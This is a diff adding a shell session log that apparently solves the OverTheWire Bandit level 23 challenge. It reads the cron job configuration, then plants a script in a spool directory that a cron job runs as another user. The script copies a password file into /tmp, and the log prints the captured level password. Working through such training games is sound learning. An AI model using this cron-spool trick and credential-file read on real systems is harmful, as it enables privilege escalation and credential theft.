@@ -1,0 +1,21 @@
+bandit23@melinda:~$ cd /etc/cron.d/
+bandit23@melinda:/etc/cron.d$ ls
+behemoth4_cleanup  cronjob_bandit23       leviathan5_cleanup    natas-session-toucher  natas25_cleanup~  php5        semtex0-ppc  vortex0
+cron-apt           cronjob_bandit24       manpage3_resetpw_job  natas-stats            natas26_cleanup   semtex0-32  semtex5      vortex20
+cronjob_bandit22   cronjob_bandit24_root  melinda-stats         natas25_cleanup        natas27_cleanup   semtex0-64  sysstat
+bandit23@melinda:/etc/cron.d$ nano cronjob_bandit24
+bandit23@melinda:/etc/cron.d$ nano cronjob_bandit24_root
+bandit23@melinda:/etc/cron.d$ mkdir /tmp/mandmpt
+bandit23@melinda:/etc/cron.d$ cd /tmp/mandmpt
+bandit23@melinda:/tmp/mandmpt$ nano try.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/mandmpt/result
+bandit23@melinda:/tmp/mandmpt$ ls
+try.sh
+bandit24@melinda:/tmp/mandmpt$ chmod +x try.sh
+bandit23@melinda:/tmp/mandmpt$ cp try.sh /var/spool/bandit24/
+bandit23@melinda:/tmp/mandmpt$ ls
+result  try.sh
+bandit23@melinda:/tmp/mandmpt$ cat result
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+bandit23@melinda:/tmp/mandmpt$
